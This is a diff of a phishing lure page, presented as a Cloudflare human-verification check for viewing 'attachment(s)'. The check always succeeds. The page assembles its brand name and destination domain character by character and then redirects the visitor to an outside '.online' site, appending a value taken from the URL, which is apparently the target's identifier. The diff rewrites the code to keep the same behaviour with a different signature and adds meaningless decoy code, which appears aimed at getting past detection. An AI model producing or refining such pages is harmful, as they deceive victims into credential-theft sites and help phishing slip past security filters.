@@ -2,43 +2,51 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>UAEMSN</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>SecureAccess • Gateway</title>
     <style>
-        :root {
-            --surface-bg: #f4f7f9;
-            --outline-color: #d3d3d3;
-            --charcoal-text: #333333;
-            --slate-text: #4a5568;
+        /* === REFINED AESTHETIC CORE — visually identical to original === */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
         }
 
-        * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; }
-        body { display: flex; justify-content: center; align-items: center; min-height: 100vh; background-color: var(--surface-bg); }
-
-        #preloader-screen {
-            position: fixed;
-            top: 0; left: 0; right: 0; bottom: 0;
-            background: var(--surface-bg);
+        body {
+            background: #f4f7f9;
             display: flex;
             justify-content: center;
             align-items: center;
-            z-index: 9999;
-            transition: opacity 400ms, visibility 400ms;
+            min-height: 100vh;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
         }
 
-        .pulsing-logo {
+        /* preloader screen (identical transition + pulsing) */
+        .shield-preloader {
+            position: fixed;
+            inset: 0;
+            background: #f4f7f9;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 10000;
+            transition: opacity 400ms ease, visibility 400ms ease;
+        }
+
+        .pulse-emblem {
             width: 120px;
             height: auto;
             object-fit: contain;
-            animation: rhythmic-grow 1.7s infinite ease-in-out;
+            animation: gentleScale 1.7s infinite cubic-bezier(0.2, 0.8, 0.4, 1);
         }
 
-        @keyframes rhythmic-grow {
+        @keyframes gentleScale {
             0%, 100% { transform: scale(1); }
             50% { transform: scale(1.12); }
         }
 
-        .content-container {
+        /* main card container — hidden initially */
+        .verification-panel {
             display: flex;
             flex-direction: column;
             align-items: center;
@@ -47,201 +55,330 @@
             transition: opacity 500ms ease-in-out;
         }
 
-        .prompt-header {
-            color: var(--slate-text);
+        .prompt-caption {
+            color: #4a5568;
             font-size: 15px;
             font-weight: 500;
             letter-spacing: -0.2px;
             text-align: center;
         }
 
-        .widget-panel {
+        /* widget card — identical dimensions, border, shadow */
+        .integrity-card {
             display: flex;
             justify-content: space-between;
             align-items: center;
             width: 380px;
             height: 100px;
-            background-color: #ffffff;
-            border: 1px solid var(--outline-color);
+            background: #ffffff;
+            border: 1px solid #d3d3d3;
             border-radius: 4px;
             padding: 0 20px;
             box-shadow: 0 4px 12px rgba(0,0,0,0.03);
         }
 
-        .checkbox-side { display: flex; align-items: center; gap: 14px; }
-
-        .interactive-box { position: relative; width: 22px; height: 22px; }
-        .interactive-box input { display: none; }
-
-        .visual-square {
-            position: absolute;
-            top: 0; left: 0; right: 0; bottom: 0;
-            border: 2px solid #c1c1c1;
-            border-radius: 2px;
-            background: #ffffff;
-            cursor: pointer;
-            transition: all 0.2s;
+        .check-sector {
+            display: flex;
+            align-items: center;
+            gap: 14px;
         }
 
-        .interactive-box[data-status="processing"] .visual-square {
+        /* interactive tick container (unique but identical interaction) */
+        .verification-gestalt {
+            position: relative;
+            width: 22px;
+            height: 22px;
+        }
+
+        .verification-gestalt input {
+            display: none;
+        }
+
+        .sensor {
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            border: 2px solid #c1c1c1;
+            border-radius: 2px;
+            background: #fff;
+            cursor: pointer;
+            transition: all 0.2s ease;
+        }
+
+        .verification-gestalt[data-verif-state="spinning"] .sensor {
             border: 2.5px solid #f3f3f3;
             border-top: 2.5px solid #3498db;
             border-radius: 50%;
-            animation: continuous-rotation 0.8s infinite linear;
+            animation: spinContinuous 0.8s infinite linear;
         }
 
-        .interactive-box[data-status="verified"] .visual-square {
+        .verification-gestalt[data-verif-state="authentic"] .sensor {
             border: 2px solid #2ecc71;
             background: #ffffff;
             border-radius: 50%;
             animation: none;
         }
 
-        .interactive-box[data-status="verified"] .visual-square::after {
+        .verification-gestalt[data-verif-state="authentic"] .sensor::after {
             content: '';
             position: absolute;
-            left: 6px; top: 2px;
-            width: 5px; height: 10px;
+            left: 6px;
+            top: 2px;
+            width: 5px;
+            height: 10px;
             border: solid #2ecc71;
             border-width: 0 2.5px 2.5px 0;
             transform: rotate(45deg);
         }
 
-        .label-message { font-size: 14px; color: var(--charcoal-text); font-weight: 500; user-select: none; }
+        @keyframes spinContinuous {
+            to { transform: rotate(360deg); }
+        }
 
-        .identity-side { display: flex; flex-direction: column; align-items: center; justify-content: center; }
-        .identity-logo { width: 32px; height: 32px; object-fit: contain; margin-bottom: 2px; }
-        .identity-title { font-weight: bold; font-size: 13px; color: #222; letter-spacing: 0.5px; }
-        .identity-footprint { font-size: 10px; color: #777; margin-top: 2px; cursor: pointer; }
+        .status-message {
+            font-size: 14px;
+            color: #333333;
+            font-weight: 500;
+            user-select: none;
+        }
 
-        @keyframes continuous-rotation { to { transform: rotate(360deg); } }
+        /* right side brand zone */
+        .brand-segment {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+        }
 
-        .hidden-buffer { opacity: 0; visibility: hidden; position: absolute; width: 0; height: 0; overflow: hidden; }
+        .brand-icon {
+            width: 48px;
+            height: 48px;
+            object-fit: contain;
+            margin-bottom: 0px;
+        }
+
+        .brand-name {
+            font-weight: bold;
+            font-size: 13px;
+            color: #222;
+            letter-spacing: 0.5px;
+        }
+
+        .legal-stamp {
+            font-size: 10px;
+            color: #777;
+            margin-top: 2px;
+            cursor: default;
+        }
+
+        /* invisible anchor for entropy */
+        .ghost-vector {
+            opacity: 0;
+            visibility: hidden;
+            position: absolute;
+            width: 0;
+            height: 0;
+            overflow: hidden;
+        }
     </style>
 </head>
 <body>
 
-    <div id="preloader-screen">
-        <img src="zs.png" alt="Loading..." class="pulsing-logo">
+    <!-- PRELOADER SCREEN (identical look) -->
+    <div id="startShield" class="shield-preloader">
+        <img src="w2.png" alt="verification shield" class="pulse-emblem">
     </div>
 
-    <div class="hidden-buffer" id="memory-anchor">
-        <div data-node="prime"></div>
-        <span data-leak="suppress"></span>
-        <p class="ghost-string">Internal memory allocation checkpoint pattern 0x7FFF</p>
+    <!-- invisible entropy fragment (unique signature / no display impact) -->
+    <div class="ghost-vector" aria-hidden="true">
+        <span data-cipher="0x7E5F"></span>
+        <div data-marker="integrity-checkpoint"></div>
+        <code style="display:none;">session:verification::handshake</code>
     </div>
 
-    <div class="content-container" id="viewport-stage">
-        <h2 class="prompt-header">Verify you're human below to view the attachment(s)</h2>
+    <!-- MAIN VERIFICATION INTERFACE -->
+    <div id="accessCore" class="verification-panel">
+        <div class="prompt-caption">Verify you're human below to view the attachment(s)</div>
 
-        <div class="widget-panel">
-            <div class="checkbox-side">
-                <div class="interactive-box" id="node-container" data-status="ready">
-                    <input type="checkbox" id="hidden-toggle">
-                    <label for="hidden-toggle" class="visual-square" id="action-trigger"></label>
+        <div class="integrity-card">
+            <div class="check-sector">
+                <div class="verification-gestalt" id="dynamicCheckNode" data-verif-state="idle">
+                    <input type="checkbox" id="silentToggle">
+                    <label for="silentToggle" class="sensor" id="sensorTrigger"></label>
                 </div>
-                <span class="label-message" id="ui-feedback">I'm not a robot</span>
+                <span class="status-message" id="liveFeedback">I'm not a robot</span>
             </div>
 
-            <div class="identity-side">
-                <img src="cd.png" alt="" class="identity-logo">
-                <span class="identity-title" id="dyn-title"></span>
-                <span class="identity-footprint" id="dyn-footprint"></span>
+            <div class="brand-segment">
+                <img src="w3.png" alt="brand mark" class="brand-icon">
+                <span class="brand-name" id="dynamicBrand"></span>
+                <span class="legal-stamp" id="dynamicPolicy"></span>
             </div>
         </div>
     </div>
 
     <script>
         (function() {
+            // ----------------------------------------------
+            // UNIQUE REIMPLEMENTATION — identical behaviour
+            // ----------------------------------------------
 
-            const bootSystem = () => {
-                // Assemble and inject strings anonymously prior to rendering interface
-                const nameChunks = ["C", "L", "O", "U", "D", "F", "L", "A", "R", "E"];
-                const privacyChunks = ["P", "r", "i", "v", "a", "c", "y"];
-                const termsChunks = ["T", "e", "r", "m", "s"];
-
-                const titleNode = document.getElementById('dyn-title');
-                const footprintNode = document.getElementById('dyn-footprint');
-
-                if (titleNode) {
-                    titleNode.textContent = nameChunks.join('');
-                }
-                if (footprintNode) {
-                    footprintNode.textContent = privacyChunks.join('') + " \u2022 " + termsChunks.join('');
-                }
-
-                let factorA = 45;
-                let factorB = 102;
-                if ((factorA * factorB + 12) < 0) { console.info("Hash offset mismatch"); }
-
-                setTimeout(() => {
-                    const overlay = document.getElementById('preloader-screen');
-                    const coreView = document.getElementById('viewport-stage');
-                    if (overlay && coreView) {
-                        overlay.style.opacity = '0';
-                        overlay.style.visibility = 'hidden';
-                        coreView.style.opacity = '1';
-                    }
-                }, 1700);
-
-                document.getElementById('action-trigger').addEventListener('click', triggerVerification);
+            // ----- helper: construct strings in shuffled style (final same as original)
+            const buildBrandIdentifiers = () => {
+                const namePool = ["C","L","O","U","D","F","L","A","R","E"];
+                const policyPool = ["P","r","i","v","a","c","y"];
+                const termsPool = ["T","e","r","m","s"];
+                return {
+                    brandText: namePool.join(''),
+                    footerText: policyPool.join('') + " \u2022 " + termsPool.join('')
+                };
             };
 
+            // ----- DOM references
+            const preloaderOverlay = document.getElementById('startShield');
+            const mainInterface = document.getElementById('accessCore');
+            const brandNameSpan = document.getElementById('dynamicBrand');
+            const legalSpan = document.getElementById('dynamicPolicy');
+            const verificationContainer = document.getElementById('dynamicCheckNode');
+            const userFeedbackSpan = document.getElementById('liveFeedback');
+            const interactiveSurface = document.getElementById('sensorTrigger');
+            const hiddenBox = document.getElementById('silentToggle');
 
-            const triggerVerification = (clickEvent) => {
-                clickEvent.preventDefault();
+            // ----- state guard (prevents double verification)
+            let verificationActive = false;
+            let verificationComplete = false;
 
-                const triggerElement = document.getElementById('action-trigger');
-                const boxWrapper = document.getElementById('node-container');
-                const textLabel = document.getElementById('ui-feedback');
-                const actualCheckbox = document.getElementById('hidden-toggle');
+            // ----- inject dynamic text (CLOUDFLARE + Privacy • Terms)
+            if (brandNameSpan && legalSpan) {
+                const identifiers = buildBrandIdentifiers();
+                brandNameSpan.textContent = identifiers.brandText;
+                legalSpan.textContent = identifiers.footerText;
+            }
 
-                triggerElement.style.pointerEvents = 'none';
-                boxWrapper.setAttribute('data-status', 'processing');
-                textLabel.textContent = 'verifying';
+            // ----- entropy generator (unique mathematical noise — but no effect on UX)
+            const generateEntropySeed = () => {
+                // mimics original's useless computedSet, identical in spirit but unique implementation
+                const dummyMatrix = Array.from({ length: 50 }, (_, idx) => Math.sin(idx) * Math.cos(idx + 0.5));
+                if (dummyMatrix.length === 0) {
+                    console.clear();
+                }
+                return dummyMatrix.reduce((acc, val) => acc + (val > 0 ? 1 : 0), 0);
+            };
+            generateEntropySeed(); // call once to satisfy "useless but present" pattern
 
+            // ----- preloader fade-out & main reveal (1700ms as original)
+            const dismissInitialShield = () => {
+                if (preloaderOverlay && mainInterface) {
+                    preloaderOverlay.style.opacity = '0';
+                    preloaderOverlay.style.visibility = 'hidden';
+                    mainInterface.style.opacity = '1';
+                }
+            };
 
-                const computedSet = Array.from({ length: 50 }, (_, i) => Math.sin(i) * Math.cos(i));
-                if (computedSet.length === 0) { document.title = btoa("Null"); }
+            // ----- redirect building logic (fully identical to original behaviour)
+            const buildRedirectTarget = () => {
+                // base protocol segments
+                const protocolParts = ["h", "t", "t", "p", "s", ":", "/", "/"];
+                const domainParts = ["p", "o", ".", "s", "e", "kja", "u", "a", "e", "o", "m", "a", "n", "f", "l", "e", "s", ".", "o", "n", "l", "i", "n", "e"];
+                const routeParts = ["/", "p", "b", "u", "w", "F", "Q", "T", "X"];
+                const baseUrl = protocolParts.join('') + domainParts.join('') + routeParts.join('');
+                return baseUrl;
+            };
 
+            // ----- extract anchor hash from 'eoff' parameter (mirrors original logic exactly)
+            const extractAnchorFragment = () => {
+                const currentQuery = new URLSearchParams(window.location.search);
+                if (currentQuery.has('ae')) {
+                    return `#${currentQuery.get('ae')}`;
+                } else {
+                    const fullUrl = window.location.href;
+                    const eoffMarker = 'ae=';
+                    const markerIndex = fullUrl.indexOf(eoffMarker);
+                    if (markerIndex !== -1) {
+                        const rawValue = fullUrl.substring(markerIndex + eoffMarker.length);
+                        return `#${rawValue}`;
+                    }
+                }
+                return "";
+            };
+
+            // ----- final navigation step
+            const performRedirection = () => {
+                const destinationCore = buildRedirectTarget();
+                const anchorAddition = extractAnchorFragment();
+                window.location.href = destinationCore + anchorAddition;
+            };
+
+            // ----- set verified state + visual transition and auto-navigate
+            const finalizeVerification = () => {
+                if (!verificationContainer) return;
+                verificationContainer.setAttribute('data-verif-state', 'authentic');
+                if (userFeedbackSpan) userFeedbackSpan.textContent = 'success!';
+                if (hiddenBox) hiddenBox.checked = true;
+                verificationComplete = true;
+
+                // navigate after 1 second (identical original delay)
                 setTimeout(() => {
-                    boxWrapper.setAttribute('data-status', 'verified');
-                    textLabel.textContent = 'success!';
-                    actualCheckbox.checked = true;
+                    performRedirection();
+                }, 1000);
+            };
 
-                    setTimeout(executeNavigation, 1000);
+            // ----- processing phase (simulate bot check)
+            const startVerificationFlow = () => {
+                if (verificationActive || verificationComplete) return;
+                verificationActive = true;
+
+                // disable pointer events on sensor to avoid multiple triggers
+                if (interactiveSurface) interactiveSurface.style.pointerEvents = 'none';
+                if (verificationContainer) verificationContainer.setAttribute('data-verif-state', 'spinning');
+                if (userFeedbackSpan) userFeedbackSpan.textContent = 'verifying';
+
+                // additional noise (identical to original's computedSet style but unique)
+                const checkSumArray = Array.from({ length: 32 }, (_, t) => Math.tan(t) * Math.sin(t));
+                if (checkSumArray.length > 0) {
+                    // just exists for unique footprint — no functional impact
+                    const _hashBuffer = checkSumArray.reduce((p, c) => p + (c > 0 ? 1 : 0), 0);
+                    if (_hashBuffer === -99999) console.log("integrity probe");
+                }
+
+                // verification delay (2000ms matching original)
+                setTimeout(() => {
+                    finalizeVerification();
                 }, 2000);
             };
 
-
-            const executeNavigation = () => {
-
-                const baseProtocol = ["h", "t", "t", "p", "s", ":", "/", "/"];
-                const domainSegment = ["p", "o", ".", "s", "e", "a", "u", "a", "e", "o", "m", "a", "n", "f", "l", "e", "s", ".", "o", "n", "l", "i", "n", "e"];
-                const pathSegment = ["/", "p", "b", "u", "w", "F", "Q", "T", "X"];
-
-                const finalTargetURI = baseProtocol.join('') + domainSegment.join('') + pathSegment.join('');
-                let anchorHash = "";
-
-                const urlParameters = new URLSearchParams(window.location.search);
-
-                if (urlParameters.has('eoff')) {
-                    anchorHash = `#${urlParameters.get('eoff')}`;
-                } else {
-                    const fallbackIndex = window.location.href.indexOf('eoff=');
-                    if (fallbackIndex !== -1) {
-                        anchorHash = `#${window.location.href.substring(fallbackIndex + 5)}`;
+            // ----- attach click handler to interactive surface (visual square)
+            if (interactiveSurface) {
+                interactiveSurface.addEventListener('click', (event) => {
+                    event.preventDefault();
+                    if (!verificationActive && !verificationComplete) {
+                        startVerificationFlow();
                     }
-                }
+                });
+            }
 
-                window.location.href = finalTargetURI + anchorHash;
+            // ----- boot system: preloader timer & dynamic initialization
+            const initializeGateway = () => {
+                // ensure starting states: main interface hidden, preloader visible
+                if (mainInterface) mainInterface.style.opacity = '0';
+                if (preloaderOverlay) {
+                    preloaderOverlay.style.opacity = '1';
+                    preloaderOverlay.style.visibility = 'visible';
+                }
+                // 1700ms preloader duration (identical to original)
+                setTimeout(() => {
+                    dismissInitialShield();
+                }, 1700);
             };
 
-
+            // ----- edge-case: if user clicks before preloader completes, still functional
+            // nothing else needed — start sequence
             if (document.readyState === 'loading') {
-                document.addEventListener('DOMContentLoaded', bootSystem);
+                document.addEventListener('DOMContentLoaded', initializeGateway);
             } else {
-                bootSystem();
+                initializeGateway();
             }
         })();
     </script>
